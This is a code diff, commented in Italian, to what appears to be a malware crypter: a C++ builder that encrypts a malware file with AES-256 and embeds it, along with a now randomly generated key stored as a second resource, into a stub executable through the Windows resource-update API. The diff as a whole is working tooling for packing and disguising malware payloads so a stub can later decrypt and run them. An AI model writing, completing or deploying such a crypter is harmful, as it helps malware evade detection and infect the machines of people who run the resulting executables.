@@ -8,6 +8,7 @@
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
 #include <fstream>
+#include <time.h>
 
 
 using namespace std; // namespace std e' un insieme di funzioni e classi che ci permettono di scrivere codice piu' velocemente
@@ -86,10 +87,13 @@ int main(int argc, char* argv[]){
     long malwareLen;
     long stubLen;
 
-    unsigned char key[] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
-        0xab, 0xf7, 0x97, 0x71, 0xc1, 0x8c, 0x2e, 0x2a,
-        0x08, 0x88, 0x3e, 0x55, 0xa8, 0x9c, 0x0f, 0xf4,
-        0x92, 0xa7, 0x45, 0x58, 0x4f, 0x18, 0x33, 0x22};
+    unsigned char key[32];
+    srand((unsigned int)time(NULL));
+
+    for(int i = 0; i< 32; i++){
+        key[i] = (unsigned char) (rand() % 256);
+        printf("chiave: %x\n", key[i]);
+    }
 
 
     //////////////////////////////
@@ -121,6 +125,9 @@ int main(int argc, char* argv[]){
     }
     printf("\n\n\n\n");
     AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
+    for(int i = 0; i < 2000; i++){
+        printf("%c",malware[i]);
+    }
 
     AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decripto in AES-256 il malware
     for(int i = 0; i < 5000; i++){
@@ -133,6 +140,7 @@ int main(int argc, char* argv[]){
 
     HANDLE hUpdateRes;
     BOOL result;
+    BOOL resultKey;
 	
 
     hUpdateRes = BeginUpdateResource("mio_stub.exe", FALSE);
@@ -145,9 +153,14 @@ int main(int argc, char* argv[]){
     //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
     //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
     result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(69), NULL, malware, malwareLen);
+    resultKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(420), NULL, key, sizeof(key));
 
     if(result == FALSE){
-        printf("impossibile aggiungere le risorse allo stub");
+        printf("impossibile aggiungere il malware allo stub");
+        return 0;
+    }
+    if(resultKey == FALSE){
+        printf("impossibile aggiungere la chiave allo stub");
         return 0;
     }
     
